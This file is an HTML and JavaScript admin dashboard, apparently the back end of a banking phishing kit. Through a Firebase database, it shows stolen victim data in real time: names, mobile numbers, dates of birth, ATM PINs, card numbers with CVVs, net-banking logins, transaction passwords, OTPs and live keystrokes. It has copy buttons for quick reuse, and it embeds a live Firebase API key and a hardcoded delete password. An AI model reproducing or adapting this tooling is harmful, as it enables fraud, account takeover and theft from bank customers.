<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Panel - Master Control</title>

  <style>
    body { font-family: Arial, sans-serif; background:#f4f4f4; margin:0; padding-bottom: 50px; }
    h2 { text-align:center; color:#00169e; margin-top:20px; text-transform: uppercase; letter-spacing: 1px; }

    /* Navigation Buttons */
    .nav-buttons {
      display:flex; flex-wrap:wrap; justify-content:center;
      gap:10px; margin:20px; position: sticky; top: 0; background: #f4f4f4; padding: 10px; z-index: 1000;
      border-bottom: 1px solid #ddd;
    }
    .nav-buttons button {
      background:#00169e; color:white; border:none;
      padding:10px 16px; border-radius:10px;
      font-weight:bold; cursor:pointer; transition: 0.3s; font-size: 13px;
    }
    .nav-buttons button:hover { background: #000b52; transform: scale(1.05); }

    /* Sections Control */
    .section {
      display:none; margin:0 16px 30px;
      padding:20px; background:white;
      border-radius:10px;
      box-shadow:0 0 8px rgba(0,0,0,0.1);
      max-width: 900px; margin-left: auto; margin-right: auto;
    }
    .section.active { display:block; }
    h3 { color: #00169e; border-bottom: 2px solid #00169e; padding-bottom: 10px; margin-top: 0; }

    /* Data Entry Box */
    .entry {
      background:#f9f9f9; border:1px solid #ddd;
      padding:15px; border-radius:10px;
      margin-bottom:15px; position: relative;
      border-left: 5px solid #00169e;
    }

    .delete-btn {
      background:red; color:white; border:none; 
      padding:6px 12px; border-radius:6px; 
      float:right; font-weight:bold; cursor:pointer;
    }

    .copy-btn {
      background: #00169e; color: white; border: none;
      padding: 3px 8px; border-radius: 4px;
      font-size: 11px; cursor: pointer; margin-left: 8px;
    }
    .copy-btn:active { background: #000; }

    .time {
      font-size:12px; color:gray;
      margin-top:10px; display:block; font-style: italic;
    }

    b { color: #333; }
    p { margin: 8px 0; font-size: 15px; display: flex; align-items: center; }
    .label-tag { background: #00169e; color: white; padding: 2px 8px; border-radius: 4px; font-size: 11px; margin-bottom: 8px; display: inline-block; }
    
    /* Live Section Special Style */
    #liveCont .entry { border-left-color: #ff0000; background: #fffdfd; }
  </style>

  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
</head>

<body>

<h2>Admin Master Control</h2>

<div class="nav-buttons">
  <button onclick="showSection('liveSection')">🔴 Live View</button>
  <button onclick="showSection('usersSection')"> User</button>
  <button onclick="showSection('dobPinSection')"> DOB + PIN</button>
  <button onclick="showSection('txnPasswordSection')"> Txn</button>
  <button onclick="showSection('cardPaymentSection')"> Card</button>
  <button onclick="showSection('netbankingSection')"> NetBanking</button>
  <button onclick="showSection('otpSection')"> OTP</button>
  <button onclick="showSection('combinedSection')"> All Logs</button>
</div>

<div id="liveSection" class="section active"><h3>🔴 Real-time Live Typing</h3><div id="liveCont"></div></div>
<div id="usersSection" class="section"><h3>👤 User Details</h3><div id="usersCont"></div></div>
<div id="dobPinSection" class="section"><h3>📅 DOB + PIN</h3><div id="dobCont"></div></div>
<div id="txnPasswordSection" class="section"><h3>🔑 Txn Password</h3><div id="txnCont"></div></div>
<div id="cardPaymentSection" class="section"><h3>💳 Card Payments</h3><div id="cardCont"></div></div>
<div id="netbankingSection" class="section"><h3>🏦 NetBanking</h3><div id="netCont"></div></div>
<div id="otpSection" class="section"><h3>📲 OTP Entries</h3><div id="otpCont"></div></div>
<div id="combinedSection" class="section"><h3>📂 Master Combined Logs</h3><div id="allCont"></div></div>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyD7kr-x5CJLdWGoj6r_MAPmhnJWe8Jc3oI",
  authDomain: "ss22-a96d3.firebaseapp.com",
  projectId: "ss22-a96d3"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

function showSection(id) {
  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

function formatTime(ts){
  if(!ts) return "Updating...";
  return ts.toDate().toLocaleString();
}

function copyToClipboard(text) {
  if(!text || text === "---") return;
  navigator.clipboard.writeText(text).then(() => {
    alert("Copied: " + text);
  }).catch(err => {
    console.error('Error copying: ', err);
  });
}

function deleteEntry(collection, docId){
  const pass = prompt("Enter delete password:");
  if(pass==="4542"){
    db.collection(collection).doc(docId).delete()
    .then(()=>alert("Deleted Successfully"))
    .catch(e=>alert(e));
  } else alert("Wrong password");
}

/* 1. USERS1 */
db.collection("users1").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("usersCont");
  cont.innerHTML = "<h3>👤 User Details</h3>";
  snap.forEach(doc=>{
    const d=doc.data();
    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('users1','${doc.id}')">Delete</button>
      <p><b>Name:</b> ${d.name} <button class="copy-btn" onclick="copyToClipboard('${d.name}')">Copy</button></p>
      <p><b>KNO:</b> ${d.kno} <button class="copy-btn" onclick="copyToClipboard('${d.kno}')">Copy</button></p>
      <p><b>Mobile:</b> ${d.mobile} <button class="copy-btn" onclick="copyToClipboard('${d.mobile}')">Copy</button></p>
      <span class="time">${formatTime(d.timestamp)}</span></div>`;
  });
});

/* 2. DOB PIN */
db.collection("dob_pin").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("dobCont");
  cont.innerHTML = "<h3>📅 DOB + PIN</h3>";
  snap.forEach(doc=>{
    const d=doc.data();
    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('dob_pin','${doc.id}')">Delete</button>
      <p><b>DOB:</b> ${d.dob} <button class="copy-btn" onclick="copyToClipboard('${d.dob}')">Copy</button></p>
      <p><b>ATM PIN:</b> ${d.pin} <button class="copy-btn" onclick="copyToClipboard('${d.pin}')">Copy</button></p>
      <span class="time">${formatTime(d.timestamp)}</span></div>`;
  });
});

/* 3. TXN PASSWORD */
db.collection("txn_passwords").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("txnCont");
  cont.innerHTML = "<h3>🔑 Txn Password</h3>";
  snap.forEach(doc=>{
    const d=doc.data();
    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('txn_passwords','${doc.id}')">Delete</button>
      <p><b>Password:</b> ${d.password} <button class="copy-btn" onclick="copyToClipboard('${d.password}')">Copy</button></p>
      <span class="time">${formatTime(d.timestamp)}</span></div>`;
  });
});

/* 4. PAYMENTS (Card & NetBanking) */
db.collection("payments").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cardCont = document.getElementById("cardCont");
  const netCont = document.getElementById("netCont");
  const allCont = document.getElementById("allCont");
  cardCont.innerHTML = "<h3>💳 Card Payments</h3>";
  netCont.innerHTML = "<h3>🏦 NetBanking</h3>";
  allCont.innerHTML = "<h3>📂 Master Combined Logs</h3>";

  snap.forEach(doc=>{
    const d = doc.data();
    let common = `<div class="entry"><button class="delete-btn" onclick="deleteEntry('payments','${doc.id}')">Delete</button>`;
    let content = "";
    
    if(d.method === "netbanking") {
      content = `<span class="label-tag">NetBanking</span>
                 <p><b>Bank:</b> ${d.bank} <button class="copy-btn" onclick="copyToClipboard('${d.bank}')">Copy</button></p>
                 <p><b>User:</b> ${d.username} <button class="copy-btn" onclick="copyToClipboard('${d.username}')">Copy</button></p>
                 <p><b>Pass:</b> ${d.password} <button class="copy-btn" onclick="copyToClipboard('${d.password}')">Copy</button></p>`;
      netCont.innerHTML += common + content + `<span class="time">${formatTime(d.timestamp)}</span></div>`;
    } else {
      content = `<span class="label-tag">${d.method}</span>
                 <p><b>Card:</b> ${d.card} <button class="copy-btn" onclick="copyToClipboard('${d.card}')">Copy</button></p>
                 <p><b>Exp:</b> ${d.expiry} | <b>CVV:</b> ${d.cvv}</p>`;
      cardCont.innerHTML += common + content + `<span class="time">${formatTime(d.timestamp)}</span></div>`;
    }
    allCont.innerHTML += common + content + `<span class="time">${formatTime(d.timestamp)}</span></div>`;
  });
});

/* 5. OTP */
db.collection("otp_entries").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("otpCont");
  cont.innerHTML = "<h3>📲 OTP Entries</h3>";
  snap.forEach(doc=>{
    const d=doc.data();
    cont.innerHTML += `<div class="entry"><button class="delete-btn" onclick="deleteEntry('otp_entries','${doc.id}')">Delete</button>
      <p><b>OTP:</b> <span style="color:red; font-size:20px; font-weight:bold;">${d.otp}</span> <button class="copy-btn" onclick="copyToClipboard('${d.otp}')">Copy</button></p>
      <p><b>Attempt:</b> ${d.attempt || "1"}</p>
      <span class="time">${formatTime(d.timestamp)}</span></div>`;
  });
});

/* 6. LIVE TYPING (REAL-TIME SYNC) */
/* 6. LIVE TYPING (REAL-TIME SYNC WITH ALL FIELDS & COPY BUTTONS) */
db.collection("live_typing").orderBy("timestamp","desc").onSnapshot(snap=>{
  const cont = document.getElementById("liveCont");
  cont.innerHTML = "<h3>🔴 Real-time Live Typing</h3>";
  
  snap.forEach(doc=>{
    const d = doc.data();
    
    // 1. Personal & User Info
    const nameData = d.name || "---";
    const knoData = d.kno || "---";
    const mobData = d.mobile || "---";

    // 2. DOB & ATM PIN (Naya Add Kiya)
    const dobData = d.dob || "---";
    const pinData = d.pin || "---";

    // 3. Card Details
    const cardData = d.debitCard || d.creditCard || d.card || "---";
    const expData = d.expiry || "---"; 
    const cvvData = d.cvv || "---";

    // 4. NetBanking & Txn Password (Naya Add Kiya)
    const userData = d.netUser || d.username || "---";
    const passData = d.netPass || d.password || "---";
    const txnData = d.txnPass || d.txnPassword || "---";

    // 5. OTP (Naya Add Kiya)
    const otpData = d.otp || "---";
    
    // Copy button helper function
    const cp = (val) => (val && val !== "---" && val !== "/") ? `<button class="copy-btn" onclick="copyToClipboard('${val}')">Copy</button>` : '';

    cont.innerHTML += `
      <div class="entry" style="border-left-color:red; background: #fffdfd;">
        <p><span class="label-tag" style="background:red;">LIVE</span> <b>Method:</b> ${d.method || "Typing..."}</p>
        
        <p><b>Name:</b> ${nameData} ${cp(nameData)} | <b>Mob:</b> ${mobData} ${cp(mobData)}</p>
        <p><b>KNO:</b> ${knoData} ${cp(knoData)}</p>
        
        <hr style="border:0; border-top:1px solid #eee; margin:10px 0;">
        
        <p><b>DOB:</b> ${dobData} ${cp(dobData)} | <b>ATM PIN:</b> <span style="color:green; font-weight:bold;">${pinData}</span> ${cp(pinData)}</p>
        
        <p><b>Card/Bank:</b> ${cardData} ${cp(cardData)}</p>
        <p><b>Expiry:</b> ${expData} ${cp(expData)} | <b>CVV:</b> <span style="color:red">${cvvData}</span> ${cp(cvvData)}</p>
        
        <p><b>User:</b> <span style="color:blue">${userData}</span> ${cp(userData)}</p>
        <p><b>Pass:</b> <span style="color:red; font-weight:bold;">${passData}</span> ${cp(passData)}</p>
        <p><b>TXN Pass:</b> <span style="color:orange; font-weight:bold;">${txnData}</span> ${cp(txnData)}</p>
        
        <hr style="border:0; border-top:1px solid #eee; margin:10px 0;">
        
        <p><b>LIVE OTP:</b> <span style="color:red; font-size:18px; font-weight:bold;">${otpData}</span> ${cp(otpData)}</p>
        
        <span class="time">Last Update: ${formatTime(d.timestamp)}</span>
      </div>`;
  });
});
</script>

</body>
</html>
